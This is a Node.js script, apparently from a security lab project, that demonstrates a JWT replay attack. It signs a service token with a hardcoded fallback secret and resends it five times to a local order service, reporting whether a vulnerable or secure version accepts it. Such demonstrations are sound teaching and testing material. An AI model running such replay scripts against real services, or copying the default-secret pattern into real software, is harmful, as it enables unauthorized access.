/**
 * ATTACK 3: Replay Attack
 * Demonstrates reusing a captured JWT token multiple times.
 * Works against VULNERABLE service; blocked by SECURE service (token tracking).
 */

const http = require("http");
const jwt = require("jsonwebtoken");

// Simulate an already-captured valid token (attacker intercepted it)
// Use the same secret the running service was started with
const JWT_SECRET = process.env.JWT_SECRET || "SUPER_SECRET";
const capturedToken = jwt.sign(
  { typ: "service", service: "order_service" },
  JWT_SECRET,
  { issuer: "auth-service", audience: "order-service" }
);

console.log("=== ATTACK 3: REPLAY ATTACK ===");
console.log("[*] Simulating captured token (intercepted from network):");
console.log(capturedToken);
console.log("\n[*] Replaying the same token 5 times...\n");

let attempt = 0;
const TOTAL_ATTEMPTS = 5;

function replayRequest() {
  if (attempt >= TOTAL_ATTEMPTS) {
    console.log("\n[RESULT] Replay attack completed");
    return;
  }

  attempt++;
  const currentAttempt = attempt;

  const options = {
    hostname: "localhost",
    port: 4000,
    path: "/orders",
    method: "GET",
    headers: {
      Authorization: `Bearer ${capturedToken}`
    }
  };

  const req = http.request(options, (res) => {
    let data = "";
    res.on("data", (chunk) => (data += chunk));
    res.on("end", () => {
      if (res.statusCode === 200) {
        console.log(`[!] ATTEMPT ${currentAttempt}: SUCCESS - Replayed token accepted!`);
        if (currentAttempt === TOTAL_ATTEMPTS) {
          console.log("\n[RESULT] VULNERABLE: Token was accepted on all replay attempts");
        }
      } else if (res.statusCode === 403) {
        console.log(`[+] ATTEMPT ${currentAttempt}: BLOCKED - ${data}`);
        if (currentAttempt === 2) {
          console.log("\n[RESULT] SECURE: Token replay was detected and blocked");
        }
      } else {
        console.log(`[-] ATTEMPT ${currentAttempt}: ${res.statusCode} - ${data}`);
      }

      // Small delay between replays
      setTimeout(replayRequest, 300);
    });
  });

  req.on("error", (err) => {
    console.log("[ERROR]", err.message);
  });

  req.end();
}

replayRequest();